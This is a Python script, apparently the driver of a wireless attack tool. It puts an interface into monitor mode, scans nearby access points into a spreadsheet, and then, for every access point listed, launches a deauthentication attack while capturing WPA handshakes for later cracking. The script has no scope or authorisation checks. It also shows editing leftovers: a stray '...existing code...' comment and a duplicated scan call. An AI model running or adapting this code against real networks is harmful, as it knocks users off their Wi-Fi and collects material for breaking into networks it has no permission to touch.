from monitor import MonitorMode
from interface import Interface
from dump import Dump
import threading
from openpyxl import load_workbook
from replay import capture_handshake, deauth_attack

ifs = Interface()
#select interfaces
ifaces = ifs.getInterfaces()
if len(ifaces) == 0:
    exit(0)

while True:    
    for i in range (len(ifaces)):
        print(i+1, ". ", ifaces[i])
    active_iface_no = int(input("[?]Interface no. : "))
    if active_iface_no <= len(ifaces) and active_iface_no >= 1:
        break
    else:
        active_iface_no = None
        
active_interface = ifs.selectInterface(active_iface_no - 1)

#start monitor mode
mon = MonitorMode(active_interface)
mon.startMonitorMode()
active_interface = ifs.selectInterface()
print(ifs.getInterfaces())

#Get APs and Clients
d = Dump()
d.enumAPs(interface = active_interface)

# ...existing code...
d.enumAPs(interface = active_interface)

# Load APs from the Excel file generated by Dump
wb = load_workbook("wifi_scan.xlsx")
ws = wb["Access_Points"]

# Skip header row, adjust indices as needed for your sheet
for row in ws.iter_rows(min_row=2, values_only=True):
    if not row or not row[0] or "BSSID" in str(row[0]):
        continue
    bssid = str(row[0]).strip()
    channel = str(row[3]).strip()  # Adjust index if channel is in a different column
    ssid = str(row[13]).strip() if len(row) > 13 else "Unknown"

    print(f"\n[*] Targeting AP: {ssid} ({bssid}) on channel {channel}")

    stop_event = threading.Event()
    deauth_thread = threading.Thread(target=deauth_attack, args=(bssid, active_interface, stop_event))
    deauth_thread.start()

    cap_file = capture_handshake(
        write_prefix=f"handshake_{ssid}",
        channel=channel,
        bssid=bssid,
        interface=active_interface,
        timeout=60
    )

    if cap_file:
        print(f"[+] Handshake captured for {ssid} ({bssid})")
        stop_event.set()
    else:
        print(f"[-] No handshake captured for {ssid} ({bssid})")

    deauth_thread.join()
    print(f"[*] Finished with {ssid} ({bssid})")

#stop monitor mode
mon.stopMonitorMode()
active_interface = ifs.selectInterface()
print(ifs.getInterfaces())
